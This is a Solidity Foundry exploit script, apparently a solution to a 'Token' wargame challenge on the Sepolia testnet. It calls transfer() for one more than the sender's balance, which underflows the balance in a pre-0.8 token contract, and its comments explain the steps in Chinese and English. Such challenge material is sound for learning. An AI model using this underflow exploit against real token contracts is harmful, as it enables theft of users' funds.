// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console2} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract Exp is Script {
    // $ forge script script/TokenExp.s.sol:Exp
    // $ forge script script/TokenExp.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
    // $ make tokenExp ARGS='--network sepolia'

    // 设置msg.sender为攻击者地址
    // 1 --sender $ACCOUNT_SEPOLIA
    // 2 attackContract.attack(tx.origin);
    // 3 从环境变量中取地址 export ATTACKER=0xYourAddress
    // attackContract.attack(vm.envAddress("ATTACKER"));
    //  vm.startBroadcast(attacker); // 指定广播的地址
    //  attackContract.attack(attacker); // 传入你控制的攻击地址
    IToken public tokenInstance = IToken(0x2f3B27110b4027a59d133f2b764b347249f4cAD5); // Replace with actual deployed address if needed
    // address public attacker = makeAddr("attacker");
    address public to = makeAddr("to");

    function run() external {
        vm.startBroadcast();
        address attacker = msg.sender; // Use msg.sender as the attacker address --sender $ACCOUNT_SEPOLIA
        // Token tokenInstance = new Token(20);
        uint256 initialBalance = tokenInstance.balanceOf(attacker);
        console2.log("Attacker balance:", initialBalance); // Check initial balance
        tokenInstance.transfer(to, initialBalance + 1); // alance = 20 - 21 => underflows to (2^256 - 1)
        console2.log("Attacker balance:", tokenInstance.balanceOf(attacker)); // Check initial balance
        console2.log("To balance:", tokenInstance.balanceOf(to)); // Check recipient balance
        vm.stopBroadcast();
    }
}
